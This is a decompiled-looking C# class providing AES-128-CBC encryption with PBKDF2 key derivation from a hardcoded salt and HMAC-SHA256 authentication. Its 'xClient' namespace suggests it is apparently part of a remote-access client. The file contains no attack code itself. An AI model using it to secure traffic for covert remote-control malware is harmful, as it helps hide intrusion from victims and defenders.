using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using xClient.Core.Helper;

namespace xClient.Core.Cryptography;

public static class AES
{
	private const int IvLength = 16;

	private const int HmacSha256Length = 32;

	private static byte[] _defaultKey;

	private static byte[] _defaultAuthKey;

	public static readonly byte[] Salt = new byte[32]
	{
		191, 235, 30, 86, 251, 205, 151, 59, 178, 25,
		2, 36, 48, 165, 120, 67, 0, 61, 86, 68,
		210, 30, 98, 185, 212, 241, 128, 231, 230, 195,
		57, 65
	};

	public static void SetDefaultKey(string key)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, Salt, 50000);
		_defaultKey = rfc2898DeriveBytes.GetBytes(16);
		_defaultAuthKey = rfc2898DeriveBytes.GetBytes(64);
	}

	public static void SetDefaultKey(string key, string authKey)
	{
		_defaultKey = Convert.FromBase64String(key);
		_defaultAuthKey = Convert.FromBase64String(authKey);
	}

	public static string Encrypt(string input, string key)
	{
		return Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes(input), Encoding.UTF8.GetBytes(key)));
	}

	public static string Encrypt(string input)
	{
		return Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes(input)));
	}

	public static byte[] Encrypt(byte[] input)
	{
		if (_defaultKey == null || _defaultKey.Length == 0)
		{
			throw new Exception("Key can not be empty.");
		}
		if (input == null || input.Length == 0)
		{
			throw new ArgumentException("Input can not be empty.");
		}
		byte[] result = new byte[0];
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			memoryStream.Position = 32L;
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.KeySize = 128;
				aesCryptoServiceProvider.BlockSize = 128;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				aesCryptoServiceProvider.Key = _defaultKey;
				aesCryptoServiceProvider.GenerateIV();
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				memoryStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
				cryptoStream.Write(input, 0, input.Length);
				cryptoStream.FlushFinalBlock();
				using HMACSHA256 hMACSHA = new HMACSHA256(_defaultAuthKey);
				byte[] array = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
				memoryStream.Position = 0L;
				memoryStream.Write(array, 0, array.Length);
			}
			result = memoryStream.ToArray();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static byte[] Encrypt(byte[] input, byte[] key)
	{
		if (key == null || key.Length == 0)
		{
			throw new Exception("Key can not be empty.");
		}
		byte[] bytes;
		using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, Salt, 50000))
		{
			key = rfc2898DeriveBytes.GetBytes(16);
			bytes = rfc2898DeriveBytes.GetBytes(64);
		}
		byte[] result = new byte[0];
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			memoryStream.Position = 32L;
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.KeySize = 128;
				aesCryptoServiceProvider.BlockSize = 128;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				aesCryptoServiceProvider.Key = key;
				aesCryptoServiceProvider.GenerateIV();
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				memoryStream.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
				cryptoStream.Write(input, 0, input.Length);
				cryptoStream.FlushFinalBlock();
				using HMACSHA256 hMACSHA = new HMACSHA256(bytes);
				byte[] array = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
				memoryStream.Position = 0L;
				memoryStream.Write(array, 0, array.Length);
			}
			result = memoryStream.ToArray();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string Decrypt(string input)
	{
		return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(input)));
	}

	public static byte[] Decrypt(byte[] input)
	{
		if (_defaultKey == null || _defaultKey.Length == 0)
		{
			throw new Exception("Key can not be empty.");
		}
		if (input == null || input.Length == 0)
		{
			throw new ArgumentException("Input can not be empty.");
		}
		byte[] array = new byte[0];
		try
		{
			using MemoryStream memoryStream = new MemoryStream(input);
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.KeySize = 128;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			aesCryptoServiceProvider.Key = _defaultKey;
			using (HMACSHA256 hMACSHA = new HMACSHA256(_defaultAuthKey))
			{
				byte[] a = hMACSHA.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
				byte[] array2 = new byte[32];
				memoryStream.Read(array2, 0, array2.Length);
				if (!CryptographyHelper.AreEqual(a, array2))
				{
					return array;
				}
			}
			byte[] array3 = new byte[16];
			memoryStream.Read(array3, 0, 16);
			aesCryptoServiceProvider.IV = array3;
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read);
			byte[] array4 = new byte[memoryStream.Length - 16 + 1];
			array = new byte[cryptoStream.Read(array4, 0, array4.Length)];
			Buffer.BlockCopy(array4, 0, array, 0, array.Length);
			return array;
		}
		catch
		{
			return array;
		}
	}
}
